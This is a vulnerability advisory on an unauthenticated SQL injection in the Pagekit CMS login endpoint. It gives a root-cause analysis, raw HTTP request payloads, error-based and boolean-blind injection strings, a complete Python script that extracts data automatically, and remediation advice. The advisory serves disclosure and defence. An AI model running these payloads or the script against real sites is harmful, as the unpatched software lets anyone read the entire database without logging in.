# Pagekit CMS <= 1.0.18 vulnerable to SQL Injection in user authentication

## Summary

Pagekit CMS (<= 1.0.18, final release) allows an **unauthenticated** attacker to perform SQL injection through the `credentials` array submitted to the public login endpoint (`POST /user/authenticate`). Array keys submitted by the attacker are interpolated verbatim into the SQL `WHERE` clause by the framework's query builder. Depending on the deployment configuration, both extraction modes are available to the attacker:

- **Debug enabled** (`application.debug = true`): error-based injection returns the full executed SQL statement and database error messages in the HTTP response, allowing direct, immediate extraction of arbitrary database contents (databases names, tables, columns, rows).
- **Debug disabled** (default production configuration): boolean-based blind injection remains fully exploitable, converting any boolean SQL expression into an HTTP 500-vs-401 response difference. Automated binary-search extraction recovers data one character at a time.

In both cases the attacker can extract the entire database without any credentials.

## Details

The vulnerability results from the combination of an unvalidated controller parameter and a framework-level query-builder sink that interpolates identifiers without neutralization:

1. **Controller entry point** — `AuthController::authenticateAction()` declares `@Request({"credentials": "array", ...})`, accepting an attacker-controlled nested array from the request body
   (`app/system/modules/user/src/Controller/AuthController.php:50-62`). The route is publicly reachable and explicitly marked `_maintenance=true` (reachable even in maintenance mode).

2. **Pass-through to the ORM** — `Auth::authenticate()` forwards the array to the user provider
   (`app/modules/auth/src/Auth.php:119-123`).

3. **Unsanitized forwarding** — `UserProvider::findByCredentials()` removes only the `password` key and passes the remaining attacker-controlled array directly into `User::where($credentials)`
   (`app/system/modules/user/src/Auth/UserProvider.php:46-53`).

4. **Injection sink (root cause)** — `QueryBuilder::addWhere()` embeds string array **keys** verbatim into the SQL string and treats **numeric-keyed values** as raw SQL fragments; only the named-placeholder name is sanitized, and only right-hand values are parameter-bound
   (`app/modules/database/src/Query/QueryBuilder.php:282-293`):

   ```php
   foreach ($condition as $key => $value) {
       if (!is_numeric($key)) {
           $name          = $this->parameter($key);   // placeholder name sanitized only
           $params[$name] = $value;
           $value         = "$key = :$name";          // $key injected raw into SQL
       }
       $args[] = $value;                              // numeric-keyed value used as raw SQL
   }
   ```

The endpoint is protected by a CSRF token, but this is not a meaningful barrier: the token is a per-session value rendered on the public login page; an attacker simply requests the page with their own session before exploiting.

## Proof of Concept

### Step 0 — Obtain the session cookie and CSRF token

The exploit requires a valid session cookie and the matching CSRF token. Both are obtained with a single unauthenticated GET request to the public login page:

```
GET /user/login HTTP/1.1
Host: <target>
```

- The response `Set-Cookie` header carries the session cookie (typically `pk_session_id=...`).

- The response HTML contains the token in a hidden form field:

  ```html
  <input type="hidden" name="_csrf" value="baef75eb4b4569d525913789b3918f4ea2e5648a">
  ```

  Extract the `value` attribute of the `input[name="_csrf"]` element.

Notes: the token is **not** single-use — it remains valid for the lifetime of the session and can be reused across requests. Replace `<session cookie>` and `<token>` in the requests below with these values. Each request should also use a **different random `credentials[username]`** value: this avoids (a) the per-username login rate limiter accumulating failed attempts, and (b) a separate `Undefined index: username` notice in the failure handler that would otherwise turn every failed request into an unrelated HTTP 500.

### Injection existence (any configuration)

A syntactically invalid SQL fragment distinguishes the injection from a normal failed login (HTTP 500 = injected fragment reached the SQL layer; 401 = normal login failure):

```
POST /user/authenticate HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: <session cookie>

credentials[username]=x&credentials[0]=)))---&credentials[password]=wrongpw&_csrf=<token>
```

### Debug enabled — direct error-based extraction

When `application.debug` is enabled, the framework renders the exception with the full SQL statement and the underlying database error, so data is returned directly in the response body:

```
credentials[0] = 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))
```

Observed response (test environment):

```
An exception occurred while executing
'SELECT * FROM <prefix>system_user WHERE 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE())) LIMIT 1':
SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~pagekit'
```

The same pattern (`EXTRACTVALUE` / `UPDATEXML` with `CONCAT`) extracts any scalar expression — table names from `information_schema`, column values, etc. — one per request, with no enumeration effort.

### Debug disabled — boolean blind extraction (default production configuration)

With debug off, error details are suppressed, but the error still occurs internally. Injecting a conditional error gadget converts any boolean SQL expression into a response-status difference:

```
credentials[0] = 1=1 AND IF((<condition>),EXP(~0),1)
```

- `EXP(~0)` raises MySQL error 1690 (DOUBLE value out of range) **only when `<condition>` is true** (MySQL `IF()` evaluates lazily) -> HTTP 500
- false conditions complete the query normally -> HTTP 401

Verified example probes (debug disabled):

| Injected condition                     | Response | Meaning                   |
| -------------------------------------- | -------- | ------------------------- |
| `LENGTH(DATABASE())=7`                 | 500      | database name length is 7 |
| `LENGTH(DATABASE())=99`                | 401      | condition false           |
| `ASCII(SUBSTRING(DATABASE(),1,1))=112` | 500      | first character is `p`    |
| `ASCII(SUBSTRING(DATABASE(),1,1))=113` | 401      | condition false           |

Automated binary-search extraction using this oracle recovers arbitrary values at ~7 requests per character (54 requests total for the database name). Because the injected condition can reference arbitrary subqueries, the oracle extracts data from **any table in the database**.

### Automated PoC script

`pagekit_sqli_dbname.py` (Python 3, requires `requests`) implements the full blind-extraction chain against a debug-disabled target: session/CSRF bootstrap, oracle sanity check, length binary search, per-character binary search. By default it extracts the current database name; `--expr` accepts any scalar SQL expression.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pagekit CMS <= 1.0.18 unauthenticated SQL injection blind extraction PoC.
Target: POST /user/authenticate (credentials array key injected into WHERE).
Oracle: IF((cond),EXP(~0),1) -> true: MySQL error 1690 / HTTP 500, false: HTTP 401.
Usage:  python pagekit_sqli_dbname.py --url http://target
Authorized testing only.
"""

import argparse
import random
import re
import string
import sys
import time

import requests


def rand_user():
    return "u_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))


class PagekitBlind:
    FMT = "1=1 AND IF(({cond}),EXP(~0),1)"

    def __init__(self, url, delay=0.05):
        self.url = url.rstrip("/") + "/user/authenticate"
        self.delay = delay
        self.sess = requests.Session()
        self.csrf = None
        self.count = 0

    def token(self):
        r = self.sess.get(self.url.replace("/user/authenticate", "/user/login"))
        self.csrf = re.search(r'name="_csrf" value="([^"]+)"', r.text).group(1)

    def ask(self, cond):
        payload = self.FMT.format(cond=cond)
        for _ in range(2):
            self.count += 1
            data = {
                "credentials[username]": rand_user(),
                "credentials[0]": payload,
                "credentials[password]": "x",
                "_csrf": self.csrf or "",
            }
            r = self.sess.post(self.url, data=data,
                               headers={"X-Requested-With": "XMLHttpRequest"})
            if r.status_code == 401 and r.text.strip().startswith("{"):
                try:
                    self.csrf = r.json()["csrf"]
                    continue
                except ValueError:
                    pass
            return r.status_code == 500
        return False

    def length(self, expr, upper=64):
        lo, hi = 0, upper
        while lo < hi:
            mid = (lo + hi) // 2
            if self.ask("LENGTH(%s)>%d" % (expr, mid)):
                lo = mid + 1
            else:
                hi = mid
            time.sleep(self.delay)
        return lo

    def value(self, expr):
        n = self.length(expr)
        print("[*] length = %d" % n)
        out = ""
        for pos in range(1, n + 1):
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                if self.ask("ASCII(SUBSTRING(%s,%d,1))>%d" % (expr, pos, mid)):
                    lo = mid + 1
                else:
                    hi = mid
                time.sleep(self.delay)
            out += chr(lo)
            print("[+] %s" % out)
        return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url")
    ap.add_argument("--expr", default="DATABASE()")
    ap.add_argument("--delay", type=float, default=0.05)
    args = ap.parse_args()

    b = PagekitBlind(args.url, args.delay)
    b.token()
    assert b.ask("1=1"), "oracle check failed (expected 500 on true)"
    assert not b.ask("1=2"), "oracle check failed (expected 401 on false)"
    print("[*] oracle OK (true=500 / false=401)")

    t0 = time.time()
    result = b.value(args.expr)
    print("-" * 40)
    print("[+] %s = %r" % (args.expr, result))
    print("[*] %d requests, %.1fs" % (b.count, time.time() - t0))


if __name__ == "__main__":
    main()
```

Observed output (test environment, `debug=false`):

```
[*] oracle OK (true=500 / false=401)
[*] length = 7
[+] p
[+] pa
[+] pag
[+] page
[+] pagek
[+] pageki
[+] pagekit
----------------------------------------
[+] DATABASE() = 'pagekit'
[*] 54 requests, 23.4s
```

**Limitations (for accurate impact assessment):** authentication bypass is *not* possible — a matched row still passes through `password_verify()`. The injection is confined to a SELECT statement (no stacked queries), so impact is confidentiality (full database read).

## Impact

- **Unauthenticated**: no account or prior privilege required
- **Confidentiality — High**: with debug enabled, direct error-based extraction of arbitrary database contents; with debug disabled (default), boolean/time-based blind extraction — either way the entire database can be recovered
- Reachable even when the site is in maintenance mode (`_maintenance` route flag)
- Affected code path is framework-level (`QueryBuilder::addWhere()`), so any current or future caller passing user-controlled arrays/keys to `where()` inherits the same sink

## Remediation

No patched release exists (project unmaintained). Recommended mitigations:

```php
// UserProvider::findByCredentials — whitelist credential keys
$credentials = array_intersect_key($credentials, ['username' => 1, 'email' => 1]);
$credentials = array_filter($credentials, 'is_scalar');
return User::where($credentials)->first();
```

Framework-level hardening (recommended to eliminate the sink class): reject non-whitelisted keys in `QueryBuilder::addWhere()` and never interpolate numeric-keyed values as raw SQL fragments. Operators of unpatched deployments should ensure `application.debug` is disabled in production, block/inspect `credentials[` array-key patterns at the WAF, and migrate away from the unmaintained project.

## Related advisories 

- **CVE-2021-44135 ** — the only previously published Pagekit SQL injection — is a **different, authenticated** issue: ORDER BY injection via the comment-listing order setting saved by `SettingsController::configAction()`. The present advisory concerns a **pre-authentication** injection at the public login endpoint caused by array-key interpolation in `QueryBuilder::addWhere()`. The previously published advisory did not describe the `addWhere()` sink or the authentication vector.

## References

- `app/system/modules/user/src/Controller/AuthController.php` (request entry)
- `app/modules/auth/src/Auth.php` (pass-through)
- `app/system/modules/user/src/Auth/UserProvider.php` (unsanitized forwarding)
- `app/modules/database/src/Query/QueryBuilder.php` (injection sink)
- [CVE Record: CVE-2021-44135](https://www.cve.org/CVERecord?id=CVE-2021-44135) (deduplication reference)
- [pagekit/pagekit: Pagekit CMS](https://github.com/pagekit/pagekit)
